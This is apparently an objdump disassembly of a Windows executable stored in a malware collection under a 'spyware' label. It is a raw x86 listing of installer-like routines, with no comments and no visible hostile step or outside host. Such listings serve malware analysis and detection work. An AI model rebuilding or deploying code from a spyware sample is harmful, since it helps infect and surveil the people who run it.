
malware_samples/spyware/dcb7ce8cf51da4997489814f1ea6a877b97b4d0fcd28d6c89d8f9f363ab17abd.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 94 05 47 00    	mov    0x470594,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 7c 82 40 00    	call   *0x40827c
  401032:	e9 4b 01 00 00       	jmp    0x401182
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 9c 05 47 00    	mov    0x47059c,%esi
  40103f:	57                   	push   %edi
  401040:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 80 82 40 00    	call   *0x408280
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 84 82 40 00    	call   *0x408284
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 80 40 00    	mov    0x408044,%ebx
  40106e:	e9 89 00 00 00       	jmp    0x4010fc
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	99                   	cltd
  40108a:	f7 ff                	idiv   %edi
  40108c:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108f:	0f b6 c0             	movzbl %al,%eax
  401092:	c1 e0 08             	shl    $0x8,%eax
  401095:	89 45 14             	mov    %eax,0x14(%ebp)
  401098:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  40109c:	0f af c1             	imul   %ecx,%eax
  40109f:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  4010a3:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a7:	03 c1                	add    %ecx,%eax
  4010a9:	99                   	cltd
  4010aa:	f7 ff                	idiv   %edi
  4010ac:	8b 4d 14             	mov    0x14(%ebp),%ecx
  4010af:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010b3:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b7:	0f b6 c0             	movzbl %al,%eax
  4010ba:	0b c8                	or     %eax,%ecx
  4010bc:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010c0:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010c4:	03 c2                	add    %edx,%eax
  4010c6:	99                   	cltd
  4010c7:	f7 ff                	idiv   %edi
  4010c9:	c1 e1 08             	shl    $0x8,%ecx
  4010cc:	0f b6 c0             	movzbl %al,%eax
  4010cf:	0b c8                	or     %eax,%ecx
  4010d1:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010d4:	50                   	push   %eax
  4010d5:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010d8:	ff 15 48 80 40 00    	call   *0x408048
  4010de:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010e2:	50                   	push   %eax
  4010e3:	89 45 14             	mov    %eax,0x14(%ebp)
  4010e6:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e9:	50                   	push   %eax
  4010ea:	ff 75 0c             	push   0xc(%ebp)
  4010ed:	ff 15 88 82 40 00    	call   *0x408288
  4010f3:	ff 75 14             	push   0x14(%ebp)
  4010f6:	ff d3                	call   *%ebx
  4010f8:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010fc:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010ff:	0f 8c 6e ff ff ff    	jl     0x401073
  401105:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401109:	74 65                	je     0x401170
  40110b:	ff 76 34             	push   0x34(%esi)
  40110e:	ff 15 4c 80 40 00    	call   *0x40804c
  401114:	89 45 14             	mov    %eax,0x14(%ebp)
  401117:	85 c0                	test   %eax,%eax
  401119:	74 55                	je     0x401170
  40111b:	8b 7d 0c             	mov    0xc(%ebp),%edi
  40111e:	6a 01                	push   $0x1
  401120:	57                   	push   %edi
  401121:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  401128:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  40112f:	ff 15 50 80 40 00    	call   *0x408050
  401135:	ff 76 58             	push   0x58(%esi)
  401138:	57                   	push   %edi
  401139:	ff 15 54 80 40 00    	call   *0x408054
  40113f:	ff 75 14             	push   0x14(%ebp)
  401142:	8b 35 58 80 40 00    	mov    0x408058,%esi
  401148:	57                   	push   %edi
  401149:	ff d6                	call   *%esi
  40114b:	68 20 08 00 00       	push   $0x820
  401150:	89 45 0c             	mov    %eax,0xc(%ebp)
  401153:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401156:	50                   	push   %eax
  401157:	6a ff                	push   $0xffffffff
  401159:	68 80 85 46 00       	push   $0x468580
  40115e:	57                   	push   %edi
  40115f:	ff 15 8c 82 40 00    	call   *0x40828c
  401165:	ff 75 0c             	push   0xc(%ebp)
  401168:	57                   	push   %edi
  401169:	ff d6                	call   *%esi
  40116b:	ff 75 14             	push   0x14(%ebp)
  40116e:	ff d3                	call   *%ebx
  401170:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401173:	50                   	push   %eax
  401174:	ff 75 08             	push   0x8(%ebp)
  401177:	ff 15 90 82 40 00    	call   *0x408290
  40117d:	5f                   	pop    %edi
  40117e:	5e                   	pop    %esi
  40117f:	33 c0                	xor    %eax,%eax
  401181:	5b                   	pop    %ebx
  401182:	c9                   	leave
  401183:	c2 10 00             	ret    $0x10
  401186:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40118a:	a1 a8 05 47 00       	mov    0x4705a8,%eax
  40118f:	8b d1                	mov    %ecx,%edx
  401191:	69 d2 20 40 00 00    	imul   $0x4020,%edx,%edx
  401197:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  40119b:	f6 c2 02             	test   $0x2,%dl
  40119e:	74 55                	je     0x4011f5
  4011a0:	56                   	push   %esi
  4011a1:	57                   	push   %edi
  4011a2:	8d 71 01             	lea    0x1(%ecx),%esi
  4011a5:	33 ff                	xor    %edi,%edi
  4011a7:	3b 35 ac 05 47 00    	cmp    0x4705ac,%esi
  4011ad:	73 44                	jae    0x4011f3
  4011af:	8b ce                	mov    %esi,%ecx
  4011b1:	69 c9 20 40 00 00    	imul   $0x4020,%ecx,%ecx
  4011b7:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011bb:	53                   	push   %ebx
  4011bc:	8b 08                	mov    (%eax),%ecx
  4011be:	f6 c1 02             	test   $0x2,%cl
  4011c1:	74 03                	je     0x4011c6
  4011c3:	47                   	inc    %edi
  4011c4:	eb 1e                	jmp    0x4011e4
  4011c6:	f6 c1 04             	test   $0x4,%cl
  4011c9:	74 09                	je     0x4011d4
  4011cb:	8b cf                	mov    %edi,%ecx
  4011cd:	4f                   	dec    %edi
  4011ce:	85 c9                	test   %ecx,%ecx
  4011d0:	74 20                	je     0x4011f2
  4011d2:	eb 10                	jmp    0x4011e4
  4011d4:	f6 c1 10             	test   $0x10,%cl
  4011d7:	75 0b                	jne    0x4011e4
  4011d9:	8b d9                	mov    %ecx,%ebx
  4011db:	33 da                	xor    %edx,%ebx
  4011dd:	83 e3 01             	and    $0x1,%ebx
  4011e0:	33 d9                	xor    %ecx,%ebx
  4011e2:	89 18                	mov    %ebx,(%eax)
  4011e4:	46                   	inc    %esi
  4011e5:	05 20 40 00 00       	add    $0x4020,%eax
  4011ea:	3b 35 ac 05 47 00    	cmp    0x4705ac,%esi
  4011f0:	72 ca                	jb     0x4011bc
  4011f2:	5b                   	pop    %ebx
  4011f3:	5f                   	pop    %edi
  4011f4:	5e                   	pop    %esi
  4011f5:	c2 04 00             	ret    $0x4
  4011f8:	55                   	push   %ebp
  4011f9:	8b ec                	mov    %esp,%ebp
  4011fb:	51                   	push   %ecx
  4011fc:	51                   	push   %ecx
  4011fd:	8b 55 08             	mov    0x8(%ebp),%edx
  401200:	53                   	push   %ebx
  401201:	8b 1d a8 05 47 00    	mov    0x4705a8,%ebx
  401207:	56                   	push   %esi
  401208:	8b f2                	mov    %edx,%esi
  40120a:	69 f6 20 40 00 00    	imul   $0x4020,%esi,%esi
  401210:	03 f3                	add    %ebx,%esi
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	33 c9                	xor    %ecx,%ecx
  401217:	57                   	push   %edi
  401218:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40121b:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  40121e:	a8 02                	test   $0x2,%al
  401220:	74 0c                	je     0x40122e
  401222:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  401225:	74 07                	je     0x40122e
  401227:	83 e0 be             	and    $0xffffffbe,%eax
  40122a:	89 46 08             	mov    %eax,0x8(%esi)
  40122d:	42                   	inc    %edx
  40122e:	3b 15 ac 05 47 00    	cmp    0x4705ac,%edx
  401234:	73 44                	jae    0x40127a
  401236:	8b c2                	mov    %edx,%eax
  401238:	69 c0 20 40 00 00    	imul   $0x4020,%eax,%eax
  40123e:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401242:	8b 0f                	mov    (%edi),%ecx
  401244:	8d 42 01             	lea    0x1(%edx),%eax
  401247:	f6 c1 02             	test   $0x2,%cl
  40124a:	74 0a                	je     0x401256
  40124c:	6a 01                	push   $0x1
  40124e:	52                   	push   %edx
  40124f:	e8 a4 ff ff ff       	call   0x4011f8
  401254:	8b 0f                	mov    (%edi),%ecx
  401256:	f6 c1 04             	test   $0x4,%cl
  401259:	75 28                	jne    0x401283
  40125b:	f6 c1 40             	test   $0x40,%cl
  40125e:	74 03                	je     0x401263
  401260:	ff 45 fc             	incl   -0x4(%ebp)
  401263:	f6 c1 01             	test   $0x1,%cl
  401266:	74 05                	je     0x40126d
  401268:	ff 45 fc             	incl   -0x4(%ebp)
  40126b:	eb 03                	jmp    0x401270
  40126d:	ff 45 f8             	incl   -0x8(%ebp)
  401270:	8b d0                	mov    %eax,%edx
  401272:	3b 05 ac 05 47 00    	cmp    0x4705ac,%eax
  401278:	72 bc                	jb     0x401236
  40127a:	33 c0                	xor    %eax,%eax
  40127c:	5f                   	pop    %edi
  40127d:	5e                   	pop    %esi
  40127e:	5b                   	pop    %ebx
  40127f:	c9                   	leave
  401280:	c2 08 00             	ret    $0x8
  401283:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  401287:	74 f3                	je     0x40127c
  401289:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  40128d:	74 06                	je     0x401295
  40128f:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401293:	eb e7                	jmp    0x40127c
  401295:	8b 4e 08             	mov    0x8(%esi),%ecx
  401298:	81 e1 7f ff ff ff    	and    $0xffffff7f,%ecx
  40129e:	83 c9 01             	or     $0x1,%ecx
  4012a1:	89 4e 08             	mov    %ecx,0x8(%esi)
  4012a4:	eb d6                	jmp    0x40127c
  4012a6:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  4012aa:	a1 a8 05 47 00       	mov    0x4705a8,%eax
  4012af:	56                   	push   %esi
  4012b0:	33 f6                	xor    %esi,%esi
  4012b2:	83 f9 20             	cmp    $0x20,%ecx
  4012b5:	73 36                	jae    0x4012ed
  4012b7:	39 35 ac 05 47 00    	cmp    %esi,0x4705ac
  4012bd:	76 2e                	jbe    0x4012ed
  4012bf:	8d 50 08             	lea    0x8(%eax),%edx
  4012c2:	57                   	push   %edi
  4012c3:	8b 02                	mov    (%edx),%eax
  4012c5:	a8 06                	test   $0x6,%al
  4012c7:	75 14                	jne    0x4012dd
  4012c9:	33 ff                	xor    %edi,%edi
  4012cb:	47                   	inc    %edi
  4012cc:	d3 e7                	shl    %cl,%edi
  4012ce:	85 7a fc             	test   %edi,-0x4(%edx)
  4012d1:	74 05                	je     0x4012d8
  4012d3:	83 c8 01             	or     $0x1,%eax
  4012d6:	eb 03                	jmp    0x4012db
  4012d8:	83 e0 fe             	and    $0xfffffffe,%eax
  4012db:	89 02                	mov    %eax,(%edx)
  4012dd:	46                   	inc    %esi
  4012de:	81 c2 20 40 00 00    	add    $0x4020,%edx
  4012e4:	3b 35 ac 05 47 00    	cmp    0x4705ac,%esi
  4012ea:	72 d7                	jb     0x4012c3
  4012ec:	5f                   	pop    %edi
  4012ed:	5e                   	pop    %esi
  4012ee:	c2 04 00             	ret    $0x4
  4012f1:	55                   	push   %ebp
  4012f2:	8b ec                	mov    %esp,%ebp
  4012f4:	83 ec 0c             	sub    $0xc,%esp
  4012f7:	a1 9c 05 47 00       	mov    0x47059c,%eax
  4012fc:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  401300:	53                   	push   %ebx
  401301:	56                   	push   %esi
  401302:	05 94 00 00 00       	add    $0x94,%eax
  401307:	57                   	push   %edi
  401308:	8b 3d ac 05 47 00    	mov    0x4705ac,%edi
  40130e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401311:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401314:	33 db                	xor    %ebx,%ebx
  401316:	39 18                	cmp    %ebx,(%eax)
  401318:	74 4b                	je     0x401365
  40131a:	3b df                	cmp    %edi,%ebx
  40131c:	73 45                	jae    0x401363
  40131e:	8b 35 a8 05 47 00    	mov    0x4705a8,%esi
  401324:	83 c6 08             	add    $0x8,%esi
  401327:	8b 16                	mov    (%esi),%edx
  401329:	f6 c2 06             	test   $0x6,%dl
  40132c:	75 28                	jne    0x401356
  40132e:	8b 45 08             	mov    0x8(%ebp),%eax
  401331:	85 c0                	test   %eax,%eax
  401333:	74 06                	je     0x40133b
  401335:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  401339:	74 1b                	je     0x401356
  40133b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40133e:	33 c0                	xor    %eax,%eax
  401340:	40                   	inc    %eax
  401341:	d3 e0                	shl    %cl,%eax
  401343:	8b 4e fc             	mov    -0x4(%esi),%ecx
  401346:	83 e2 01             	and    $0x1,%edx
  401349:	23 c8                	and    %eax,%ecx
  40134b:	8b c1                	mov    %ecx,%eax
  40134d:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401350:	d3 e2                	shl    %cl,%edx
  401352:	3b c2                	cmp    %edx,%eax
  401354:	75 0b                	jne    0x401361
  401356:	43                   	inc    %ebx
  401357:	81 c6 20 40 00 00    	add    $0x4020,%esi
  40135d:	3b df                	cmp    %edi,%ebx
  40135f:	72 c6                	jb     0x401327
  401361:	3b df                	cmp    %edi,%ebx
  401363:	74 0d                	je     0x401372
  401365:	ff 45 fc             	incl   -0x4(%ebp)
  401368:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40136c:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401370:	72 9f                	jb     0x401311
  401372:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401375:	5f                   	pop    %edi
  401376:	5e                   	pop    %esi
  401377:	5b                   	pop    %ebx
  401378:	c9                   	leave
  401379:	c2 04 00             	ret    $0x4
  40137c:	8b 44 24 04          	mov    0x4(%esp),%eax
  401380:	85 c0                	test   %eax,%eax
  401382:	7d 14                	jge    0x401398
  401384:	40                   	inc    %eax
  401385:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  40138b:	b9 00 10 47 00       	mov    $0x471000,%ecx
  401390:	2b c8                	sub    %eax,%ecx
  401392:	51                   	push   %ecx
  401393:	e8 54 46 00 00       	call   0x4059ec
  401398:	c2 04 00             	ret    $0x4
  40139b:	56                   	push   %esi
  40139c:	8b 74 24 08          	mov    0x8(%esp),%esi
  4013a0:	eb 6a                	jmp    0x40140c
  4013a2:	8b 0d b0 05 47 00    	mov    0x4705b0,%ecx
  4013a8:	8b c6                	mov    %esi,%eax
  4013aa:	6b c0 1c             	imul   $0x1c,%eax,%eax
  4013ad:	03 c1                	add    %ecx,%eax
  4013af:	83 38 01             	cmpl   $0x1,(%eax)
  4013b2:	74 5c                	je     0x401410
  4013b4:	50                   	push   %eax
  4013b5:	e8 e2 01 00 00       	call   0x40159c
  4013ba:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  4013bf:	74 55                	je     0x401416
  4013c1:	50                   	push   %eax
  4013c2:	e8 b5 ff ff ff       	call   0x40137c
  4013c7:	85 c0                	test   %eax,%eax
  4013c9:	75 04                	jne    0x4013cf
  4013cb:	40                   	inc    %eax
  4013cc:	46                   	inc    %esi
  4013cd:	eb 07                	jmp    0x4013d6
  4013cf:	48                   	dec    %eax
  4013d0:	8b ce                	mov    %esi,%ecx
  4013d2:	8b f0                	mov    %eax,%esi
  4013d4:	2b c1                	sub    %ecx,%eax
  4013d6:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013db:	74 2f                	je     0x40140c
  4013dd:	01 05 6c 85 46 00    	add    %eax,0x46856c
  4013e3:	6a 00                	push   $0x0
  4013e5:	ff 35 64 85 46 00    	push   0x468564
  4013eb:	68 30 75 00 00       	push   $0x7530
  4013f0:	ff 35 6c 85 46 00    	push   0x46856c
  4013f6:	ff 15 48 81 40 00    	call   *0x408148
  4013fc:	50                   	push   %eax
  4013fd:	68 02 04 00 00       	push   $0x402
  401402:	ff 74 24 18          	push   0x18(%esp)
  401406:	ff 15 78 82 40 00    	call   *0x408278
  40140c:	85 f6                	test   %esi,%esi
  40140e:	7d 92                	jge    0x4013a2
  401410:	33 c0                	xor    %eax,%eax
  401412:	5e                   	pop    %esi
  401413:	c2 08 00             	ret    $0x8
  401416:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40141b:	eb f5                	jmp    0x401412
  40141d:	8b 44 24 04          	mov    0x4(%esp),%eax
  401421:	8b 0d 9c 05 47 00    	mov    0x47059c,%ecx
  401427:	6a 00                	push   $0x0
  401429:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  40142d:	e8 69 ff ff ff       	call   0x40139b
  401432:	c2 04 00             	ret    $0x4
  401435:	68 b0 e0 40 00       	push   $0x40e0b0
  40143a:	ff 74 24 08          	push   0x8(%esp)
  40143e:	e8 04 36 00 00       	call   0x404a47
  401443:	c2 04 00             	ret    $0x4
  401446:	a1 a4 a0 40 00       	mov    0x40a0a4,%eax
  40144b:	ff 34 88             	push   (%eax,%ecx,4)
  40144e:	6a 00                	push   $0x0
  401450:	e8 49 4c 00 00       	call   0x40609e
  401455:	50                   	push   %eax
  401456:	e8 91 45 00 00       	call   0x4059ec
  40145b:	c3                   	ret
  40145c:	8b c6                	mov    %esi,%eax
  40145e:	85 f6                	test   %esi,%esi
  401460:	7d 02                	jge    0x401464
  401462:	f7 d8                	neg    %eax
  401464:	8b 15 a4 a0 40 00    	mov    0x40a0a4,%edx
  40146a:	8b c8                	mov    %eax,%ecx
  40146c:	c1 f8 04             	sar    $0x4,%eax
  40146f:	69 c0 08 40 00 00    	imul   $0x4008,%eax,%eax
  401475:	57                   	push   %edi
  401476:	83 e1 0f             	and    $0xf,%ecx
  401479:	ff 34 8a             	push   (%edx,%ecx,4)
  40147c:	05 a8 a0 40 00       	add    $0x40a0a8,%eax
  401481:	50                   	push   %eax
  401482:	e8 17 4c 00 00       	call   0x40609e
  401487:	8b f8                	mov    %eax,%edi
  401489:	85 f6                	test   %esi,%esi
  40148b:	7d 06                	jge    0x401493
  40148d:	57                   	push   %edi
  40148e:	e8 28 46 00 00       	call   0x405abb
  401493:	8b c7                	mov    %edi,%eax
  401495:	5f                   	pop    %edi
  401496:	c3                   	ret
  401497:	55                   	push   %ebp
  401498:	8b ec                	mov    %esp,%ebp
  40149a:	81 ec 10 02 00 00    	sub    $0x210,%esp
  4014a0:	53                   	push   %ebx
  4014a1:	56                   	push   %esi
  4014a2:	57                   	push   %edi
  4014a3:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4014a6:	50                   	push   %eax
  4014a7:	a1 70 06 47 00       	mov    0x470670,%eax
  4014ac:	83 c8 08             	or     $0x8,%eax
  4014af:	50                   	push   %eax
  4014b0:	33 db                	xor    %ebx,%ebx
  4014b2:	53                   	push   %ebx
  4014b3:	ff 75 0c             	push   0xc(%ebp)
  4014b6:	ff 75 08             	push   0x8(%ebp)
  4014b9:	ff 15 04 80 40 00    	call   *0x408004
  4014bf:	3b c3                	cmp    %ebx,%eax
  4014c1:	75 69                	jne    0x40152c
  4014c3:	8b 35 00 80 40 00    	mov    0x408000,%esi
  4014c9:	bf 05 01 00 00       	mov    $0x105,%edi
  4014ce:	eb 19                	jmp    0x4014e9
  4014d0:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  4014d3:	75 4b                	jne    0x401520
  4014d5:	53                   	push   %ebx
  4014d6:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4014dc:	50                   	push   %eax
  4014dd:	ff 75 fc             	push   -0x4(%ebp)
  4014e0:	e8 b2 ff ff ff       	call   0x401497
  4014e5:	85 c0                	test   %eax,%eax
  4014e7:	75 12                	jne    0x4014fb
  4014e9:	57                   	push   %edi
  4014ea:	8d 85 f0 fd ff ff    	lea    -0x210(%ebp),%eax
  4014f0:	50                   	push   %eax
  4014f1:	53                   	push   %ebx
  4014f2:	ff 75 fc             	push   -0x4(%ebp)
  4014f5:	ff d6                	call   *%esi
  4014f7:	85 c0                	test   %eax,%eax
  4014f9:	74 d5                	je     0x4014d0
  4014fb:	ff 75 fc             	push   -0x4(%ebp)
  4014fe:	ff 15 08 80 40 00    	call   *0x408008
  401504:	6a 02                	push   $0x2
  401506:	e8 88 46 00 00       	call   0x405b93
  40150b:	3b c3                	cmp    %ebx,%eax
  40150d:	74 24                	je     0x401533
  40150f:	53                   	push   %ebx
  401510:	ff 35 70 06 47 00    	push   0x470670
  401516:	ff 75 0c             	push   0xc(%ebp)
  401519:	ff 75 08             	push   0x8(%ebp)
  40151c:	ff d0                	call   *%eax
  40151e:	eb 0c                	jmp    0x40152c
  401520:	ff 75 fc             	push   -0x4(%ebp)
  401523:	ff 15 08 80 40 00    	call   *0x408008
  401529:	33 c0                	xor    %eax,%eax
  40152b:	40                   	inc    %eax
  40152c:	5f                   	pop    %edi
  40152d:	5e                   	pop    %esi
  40152e:	5b                   	pop    %ebx
  40152f:	c9                   	leave
  401530:	c2 0c 00             	ret    $0xc
  401533:	39 1d 70 06 47 00    	cmp    %ebx,0x470670
  401539:	75 ee                	jne    0x401529
  40153b:	ff 75 0c             	push   0xc(%ebp)
  40153e:	ff 75 08             	push   0x8(%ebp)
  401541:	ff 15 0c 80 40 00    	call   *0x40800c
  401547:	85 c0                	test   %eax,%eax
  401549:	75 de                	jne    0x401529
  40154b:	eb df                	jmp    0x40152c
  40154d:	55                   	push   %ebp
  40154e:	8b ec                	mov    %esp,%ebp
  401550:	a1 a4 a0 40 00       	mov    0x40a0a4,%eax
  401555:	8b 40 04             	mov    0x4(%eax),%eax
  401558:	56                   	push   %esi
  401559:	57                   	push   %edi
  40155a:	85 c0                	test   %eax,%eax
  40155c:	74 04                	je     0x401562
  40155e:	8b f8                	mov    %eax,%edi
  401560:	eb 0c                	jmp    0x40156e
  401562:	8b 3d 44 06 47 00    	mov    0x470644,%edi
  401568:	81 c7 01 00 00 80    	add    $0x80000001,%edi
  40156e:	8d 45 08             	lea    0x8(%ebp),%eax
  401571:	50                   	push   %eax
  401572:	a1 70 06 47 00       	mov    0x470670,%eax
  401577:	0b 45 08             	or     0x8(%ebp),%eax
  40157a:	50                   	push   %eax
  40157b:	6a 00                	push   $0x0
  40157d:	6a 22                	push   $0x22
  40157f:	5e                   	pop    %esi
  401580:	e8 d7 fe ff ff       	call   0x40145c
  401585:	50                   	push   %eax
  401586:	57                   	push   %edi
  401587:	ff 15 04 80 40 00    	call   *0x408004
  40158d:	f7 d8                	neg    %eax
  40158f:	1b c0                	sbb    %eax,%eax
  401591:	f7 d0                	not    %eax
  401593:	23 45 08             	and    0x8(%ebp),%eax
  401596:	5f                   	pop    %edi
  401597:	5e                   	pop    %esi
  401598:	5d                   	pop    %ebp
  401599:	c2 04 00             	ret    $0x4
  40159c:	55                   	push   %ebp
  40159d:	8b ec                	mov    %esp,%ebp
  40159f:	81 ec a4 02 00 00    	sub    $0x2a4,%esp
  4015a5:	a1 94 05 47 00       	mov    0x470594,%eax
  4015aa:	53                   	push   %ebx
  4015ab:	56                   	push   %esi
  4015ac:	8b 75 08             	mov    0x8(%ebp),%esi
  4015af:	57                   	push   %edi
  4015b0:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4015b4:	6a 07                	push   $0x7
  4015b6:	59                   	pop    %ecx
  4015b7:	8d 7d d8             	lea    -0x28(%ebp),%edi
  4015ba:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  4015bc:	8b 55 e0             	mov    -0x20(%ebp),%edx
  4015bf:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4015c2:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4015c5:	8b f8                	mov    %eax,%edi
  4015c7:	8b da                	mov    %edx,%ebx
  4015c9:	69 ff 08 40 00 00    	imul   $0x4008,%edi,%edi
  4015cf:	69 db 08 40 00 00    	imul   $0x4008,%ebx,%ebx
  4015d5:	b9 00 10 47 00       	mov    $0x471000,%ecx
  4015da:	03 f9                	add    %ecx,%edi
  4015dc:	03 d9                	add    %ecx,%ebx
  4015de:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4015e1:	89 0d a4 a0 40 00    	mov    %ecx,0x40a0a4
  4015e7:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  4015ea:	83 c1 fe             	add    $0xfffffffe,%ecx
  4015ed:	83 f9 44             	cmp    $0x44,%ecx
  4015f0:	0f 87 62 16 00 00    	ja     0x402c58
  4015f6:	ff 24 8d 6c 2c 40 00 	jmp    *0x402c6c(,%ecx,4)
  4015fd:	6a 00                	push   $0x0
  4015ff:	50                   	push   %eax
  401600:	e8 42 34 00 00       	call   0x404a47
  401605:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40160a:	e9 54 16 00 00       	jmp    0x402c63
  40160f:	ff 05 54 85 46 00    	incl   0x468554
  401615:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401619:	74 ea                	je     0x401605
  40161b:	6a 00                	push   $0x0
  40161d:	ff 15 2c 82 40 00    	call   *0x40822c
  401623:	eb e0                	jmp    0x401605
  401625:	50                   	push   %eax
  401626:	e8 51 fd ff ff       	call   0x40137c
  40162b:	48                   	dec    %eax
  40162c:	6a 00                	push   $0x0
  40162e:	50                   	push   %eax
  40162f:	e8 67 fd ff ff       	call   0x40139b
  401634:	e9 2a 16 00 00       	jmp    0x402c63
  401639:	6a 00                	push   $0x0
  40163b:	50                   	push   %eax
  40163c:	e8 06 34 00 00       	call   0x404a47
  401641:	e9 12 16 00 00       	jmp    0x402c58
  401646:	33 c9                	xor    %ecx,%ecx
  401648:	e8 f9 fd ff ff       	call   0x401446
  40164d:	83 f8 01             	cmp    $0x1,%eax
  401650:	7f 03                	jg     0x401655
  401652:	33 c0                	xor    %eax,%eax
  401654:	40                   	inc    %eax
  401655:	50                   	push   %eax
  401656:	ff 15 8c 80 40 00    	call   *0x40808c
  40165c:	e9 f7 15 00 00       	jmp    0x402c58
  401661:	ff 75 f8             	push   -0x8(%ebp)
  401664:	ff 15 30 82 40 00    	call   *0x408230
  40166a:	e9 e9 15 00 00       	jmp    0x402c58
  40166f:	c1 e0 02             	shl    $0x2,%eax
  401672:	83 7d e4 00          	cmpl   $0x0,-0x1c(%ebp)
  401676:	75 23                	jne    0x40169b
  401678:	8b 88 40 06 47 00    	mov    0x470640(%eax),%ecx
  40167e:	89 88 00 06 47 00    	mov    %ecx,0x470600(%eax)
  401684:	33 c9                	xor    %ecx,%ecx
  401686:	41                   	inc    %ecx
  401687:	e8 ba fd ff ff       	call   0x401446
  40168c:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40168f:	89 04 8d 40 06 47 00 	mov    %eax,0x470640(,%ecx,4)
  401696:	e9 bd 15 00 00       	jmp    0x402c58
  40169b:	8b 88 00 06 47 00    	mov    0x470600(%eax),%ecx
  4016a1:	89 88 40 06 47 00    	mov    %ecx,0x470640(%eax)
  4016a7:	e9 ac 15 00 00       	jmp    0x402c58
  4016ac:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  4016af:	8d 14 95 40 06 47 00 	lea    0x470640(,%edx,4),%edx
  4016b6:	8b 0a                	mov    (%edx),%ecx
  4016b8:	33 c0                	xor    %eax,%eax
  4016ba:	85 c9                	test   %ecx,%ecx
  4016bc:	0f 94 c0             	sete   %al
